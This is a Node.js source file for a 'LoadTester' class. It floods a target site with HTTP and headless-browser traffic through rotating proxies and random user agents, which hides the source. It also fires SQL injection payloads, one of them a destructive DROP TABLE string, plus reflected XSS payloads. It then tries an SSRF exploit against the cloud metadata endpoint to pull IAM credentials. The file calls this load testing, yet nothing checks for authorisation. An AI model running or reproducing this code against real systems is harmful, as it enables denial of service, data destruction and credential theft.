const axios = require('axios');
const puppeteer = require('puppeteer');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const UserAgent = require('user-agents');
const winston = require('winston');

class LoadTester {
  constructor(proxyManager, testManager) {
    this.proxyManager = proxyManager;
    this.testManager = testManager;
    this.activeTests = new Map();
    this.logger = winston.createLogger({
      level: 'info',
      format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
      ),
      transports: [
        new winston.transports.File({ filename: 'logs/loadtest.log' }),
        new winston.transports.Console()
      ]
    });
  }

  async startTest(testConfig, callback) {
    const { id, targetUrl, config } = testConfig;
    
    this.logger.info(`Starting load test ${id} for ${targetUrl}`);
    
    const testState = {
      id,
      targetUrl,
      config,
      startTime: new Date(),
      results: {
        requests: 0,
        successful: 0,
        failed: 0,
        errors: [],
        responseTimes: [],
        vulnerabilities: [],
        exploitationAttempts: []
      },
      isRunning: true,
      intervals: []
    };

    this.activeTests.set(id, testState);

    // Start different types of load testing
    await this.startHttpLoadTest(testState, callback);
    await this.startBrowserLoadTest(testState, callback);
    await this.startVulnerabilityExploitation(testState, callback);
  }

  async startHttpLoadTest(testState, callback) {
    const { targetUrl, config } = testState;
    const { concurrentUsers, duration, requestsPerSecond } = config;

    // Create concurrent HTTP requests
    for (let i = 0; i < concurrentUsers; i++) {
      const interval = setInterval(async () => {
        if (!testState.isRunning) {
          clearInterval(interval);
          return;
        }

        try {
          const proxy = await this.proxyManager.getRandomProxy();
          const userAgent = new UserAgent();
          
          const startTime = Date.now();
          const response = await this.makeHttpRequest(targetUrl, proxy, userAgent);
          const responseTime = Date.now() - startTime;

          testState.results.requests++;
          testState.results.responseTimes.push(responseTime);

          if (response.success) {
            testState.results.successful++;
          } else {
            testState.results.failed++;
            testState.results.errors.push({
              timestamp: new Date(),
              error: response.error,
              proxy: proxy?.host
            });
          }

          callback(testState.results);
        } catch (error) {
          testState.results.failed++;
          testState.results.errors.push({
            timestamp: new Date(),
            error: error.message
          });
          callback(testState.results);
        }
      }, 1000 / requestsPerSecond);

      testState.intervals.push(interval);
    }

    // Stop test after duration
    setTimeout(() => {
      this.stopTest(testState.id);
    }, duration * 1000);
  }

  async startBrowserLoadTest(testState, callback) {
    const { targetUrl, config } = testState;
    const { browserInstances } = config;

    for (let i = 0; i < browserInstances; i++) {
      this.launchBrowserInstance(targetUrl, testState, callback);
    }
  }

  async launchBrowserInstance(targetUrl, testState, callback) {
    try {
      const proxy = await this.proxyManager.getRandomProxy();
      const browser = await puppeteer.launch({
        headless: true,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu'
        ]
      });

      const page = await browser.newPage();
      
      if (proxy) {
        await page.authenticate({
          username: proxy.username,
          password: proxy.password
        });
      }

      // Set random user agent
      await page.setUserAgent(new UserAgent().toString());

      // Monitor for vulnerabilities
      page.on('response', async (response) => {
        await this.analyzeResponseForVulnerabilities(response, testState, callback);
      });

      // Continuous browsing
      const browseInterval = setInterval(async () => {
        if (!testState.isRunning) {
          clearInterval(browseInterval);
          await browser.close();
          return;
        }

        try {
          const startTime = Date.now();
          await page.goto(targetUrl, { waitUntil: 'networkidle2' });
          const responseTime = Date.now() - startTime;

          testState.results.requests++;
          testState.results.responseTimes.push(responseTime);
          testState.results.successful++;

          callback(testState.results);
        } catch (error) {
          testState.results.failed++;
          testState.results.errors.push({
            timestamp: new Date(),
            error: error.message,
            type: 'browser'
          });
          callback(testState.results);
        }
      }, 5000);

      testState.intervals.push(browseInterval);
    } catch (error) {
      this.logger.error('Error launching browser instance:', error);
    }
  }

  async startVulnerabilityExploitation(testState, callback) {
    const { targetUrl, config } = testState;
    const { exploitVulnerabilities } = config;

    if (!exploitVulnerabilities) return;

    // Start vulnerability scanning and exploitation
    const exploitInterval = setInterval(async () => {
      if (!testState.isRunning) {
        clearInterval(exploitInterval);
        return;
      }

      try {
        await this.scanForVulnerabilities(targetUrl, testState, callback);
        await this.exploitKnownVulnerabilities(targetUrl, testState, callback);
      } catch (error) {
        this.logger.error('Error in vulnerability exploitation:', error);
      }
    }, 10000);

    testState.intervals.push(exploitInterval);
  }

  async scanForVulnerabilities(targetUrl, testState, callback) {
    try {
      const proxy = await this.proxyManager.getRandomProxy();
      const userAgent = new UserAgent();

      // Scan for common vulnerabilities
      const vulnerabilities = await this.performVulnerabilityScan(targetUrl, proxy, userAgent);
      
      testState.results.vulnerabilities.push(...vulnerabilities);
      callback(testState.results);
    } catch (error) {
      this.logger.error('Error scanning for vulnerabilities:', error);
    }
  }

  async performVulnerabilityScan(targetUrl, proxy, userAgent) {
    const vulnerabilities = [];

    // Check for vulnerable JavaScript libraries
    try {
      const response = await this.makeHttpRequest(targetUrl, proxy, userAgent);
      if (response.success) {
        const jsVulnerabilities = this.detectJavaScriptVulnerabilities(response.data);
        vulnerabilities.push(...jsVulnerabilities);
      }
    } catch (error) {
      this.logger.error('Error in JS vulnerability scan:', error);
    }

    // Check for SQL injection vulnerabilities
    try {
      const sqlVulnerabilities = await this.testSQLInjection(targetUrl, proxy, userAgent);
      vulnerabilities.push(...sqlVulnerabilities);
    } catch (error) {
      this.logger.error('Error in SQL injection test:', error);
    }

    // Check for XSS vulnerabilities
    try {
      const xssVulnerabilities = await this.testXSS(targetUrl, proxy, userAgent);
      vulnerabilities.push(...xssVulnerabilities);
    } catch (error) {
      this.logger.error('Error in XSS test:', error);
    }

    return vulnerabilities;
  }

  detectJavaScriptVulnerabilities(htmlContent) {
    const vulnerabilities = [];
    
    // Check for vulnerable Axios versions
    const axiosPatterns = [
      /axios.*v1\.6\.5/,
      /axios.*v1\.6\.4/,
      /axios.*v1\.6\.3/
    ];

    axiosPatterns.forEach(pattern => {
      if (pattern.test(htmlContent)) {
        vulnerabilities.push({
          type: 'Vulnerable JS Library',
          severity: 'HIGH',
          description: 'Vulnerable Axios version detected',
          cve: ['CVE-2025-27152', 'CVE-2024-39338'],
          evidence: pattern.source,
          timestamp: new Date()
        });
      }
    });

    // Check for other vulnerable libraries
    const vulnerableLibraries = [
      { name: 'jquery', pattern: /jquery.*1\.12\.4/, cve: ['CVE-2021-21349'] },
      { name: 'lodash', pattern: /lodash.*4\.17\.20/, cve: ['CVE-2021-23337'] },
      { name: 'moment', pattern: /moment.*2\.29\.3/, cve: ['CVE-2022-31129'] }
    ];

    vulnerableLibraries.forEach(lib => {
      if (lib.pattern.test(htmlContent)) {
        vulnerabilities.push({
          type: 'Vulnerable JS Library',
          severity: 'HIGH',
          description: `Vulnerable ${lib.name} version detected`,
          cve: lib.cve,
          evidence: lib.pattern.source,
          timestamp: new Date()
        });
      }
    });

    return vulnerabilities;
  }

  async testSQLInjection(targetUrl, proxy, userAgent) {
    const vulnerabilities = [];
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --"
    ];

    for (const payload of sqlPayloads) {
      try {
        const testUrl = `${targetUrl}?id=${encodeURIComponent(payload)}`;
        const response = await this.makeHttpRequest(testUrl, proxy, userAgent);
        
        if (response.success && this.detectSQLInjectionResponse(response.data)) {
          vulnerabilities.push({
            type: 'SQL Injection',
            severity: 'CRITICAL',
            description: 'SQL injection vulnerability detected',
            payload: payload,
            evidence: 'SQL error in response',
            timestamp: new Date()
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return vulnerabilities;
  }

  async testXSS(targetUrl, proxy, userAgent) {
    const vulnerabilities = [];
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>'
    ];

    for (const payload of xssPayloads) {
      try {
        const testUrl = `${targetUrl}?search=${encodeURIComponent(payload)}`;
        const response = await this.makeHttpRequest(testUrl, proxy, userAgent);
        
        if (response.success && response.data.includes(payload)) {
          vulnerabilities.push({
            type: 'Cross-Site Scripting (XSS)',
            severity: 'HIGH',
            description: 'XSS vulnerability detected',
            payload: payload,
            evidence: 'Payload reflected in response',
            timestamp: new Date()
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return vulnerabilities;
  }

  async exploitKnownVulnerabilities(targetUrl, testState, callback) {
    const vulnerabilities = testState.results.vulnerabilities;
    
    for (const vuln of vulnerabilities) {
      if (vuln.type === 'Vulnerable JS Library' && vuln.cve.includes('CVE-2025-27152')) {
        await this.exploitAxiosVulnerability(targetUrl, testState, callback);
      }
    }
  }

  async exploitAxiosVulnerability(targetUrl, testState, callback) {
    try {
      const proxy = await this.proxyManager.getRandomProxy();
      const userAgent = new UserAgent();

      // Exploit CVE-2025-27152 (Axios SSRF vulnerability)
      const exploitPayload = {
        method: 'POST',
        url: targetUrl,
        data: {
          url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          method: 'GET'
        },
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': userAgent.toString()
        }
      };

      const response = await this.makeHttpRequest(targetUrl, proxy, userAgent, exploitPayload);
      
      testState.results.exploitationAttempts.push({
        vulnerability: 'CVE-2025-27152',
        success: response.success,
        timestamp: new Date(),
        response: response.data
      });

      callback(testState.results);
    } catch (error) {
      this.logger.error('Error exploiting Axios vulnerability:', error);
    }
  }

  async makeHttpRequest(url, proxy, userAgent, customConfig = {}) {
    try {
      let agent = null;
      
      if (proxy) {
        const proxyUrl = `${proxy.protocol}://${proxy.host}:${proxy.port}`;
        
        if (proxy.protocol === 'https') {
          agent = new HttpsProxyAgent(proxyUrl);
        } else if (proxy.protocol === 'http') {
          agent = new HttpProxyAgent(proxyUrl);
        } else if (proxy.protocol === 'socks5') {
          agent = new SocksProxyAgent(proxyUrl);
        }
      }

      const config = {
        method: 'GET',
        url,
        timeout: 10000,
        headers: {
          'User-Agent': userAgent.toString(),
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate',
          'Connection': 'keep-alive',
          'Upgrade-Insecure-Requests': '1'
        },
        ...customConfig
      };

      if (agent) {
        config.httpsAgent = agent;
        config.httpAgent = agent;
      }

      if (proxy && proxy.username && proxy.password) {
        config.auth = {
          username: proxy.username,
          password: proxy.password
        };
      }

      const response = await axios(config);
      
      return {
        success: true,
        status: response.status,
        data: response.data,
        headers: response.headers
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
        status: error.response?.status
      };
    }
  }

  detectSQLInjectionResponse(content) {
    const sqlErrorPatterns = [
      /sql syntax/i,
      /mysql error/i,
      /oracle error/i,
      /postgresql error/i,
      /sql server error/i,
      /syntax error/i
    ];

    return sqlErrorPatterns.some(pattern => pattern.test(content));
  }

  async analyzeResponseForVulnerabilities(response, testState, callback) {
    try {
      const url = response.url();
      const status = response.status();
      const headers = response.headers();

      // Check for security headers
      const securityHeaders = {
        'X-Frame-Options': headers['x-frame-options'],
        'X-Content-Type-Options': headers['x-content-type-options'],
        'X-XSS-Protection': headers['x-xss-protection'],
        'Strict-Transport-Security': headers['strict-transport-security'],
        'Content-Security-Policy': headers['content-security-policy']
      };

      const missingHeaders = Object.entries(securityHeaders)
        .filter(([key, value]) => !value)
        .map(([key]) => key);

      if (missingHeaders.length > 0) {
        testState.results.vulnerabilities.push({
          type: 'Missing Security Headers',
          severity: 'MEDIUM',
          description: `Missing security headers: ${missingHeaders.join(', ')}`,
          evidence: `URL: ${url}`,
          timestamp: new Date()
        });
      }

      callback(testState.results);
    } catch (error) {
      this.logger.error('Error analyzing response:', error);
    }
  }

  async stopTest(testId) {
    const testState = this.activeTests.get(testId);
    if (!testState) return;

    testState.isRunning = false;
    
    // Clear all intervals
    testState.intervals.forEach(interval => clearInterval(interval));
    
    // Update test results
    testState.endTime = new Date();
    testState.duration = testState.endTime - testState.startTime;
    
    await this.testManager.updateTest(testId, {
      status: 'completed',
      endTime: testState.endTime,
      results: testState.results
    });

    this.activeTests.delete(testId);
    this.logger.info(`Load test ${testId} stopped`);
  }

  getTestStatus(testId) {
    return this.activeTests.get(testId);
  }
}

module.exports = LoadTester;
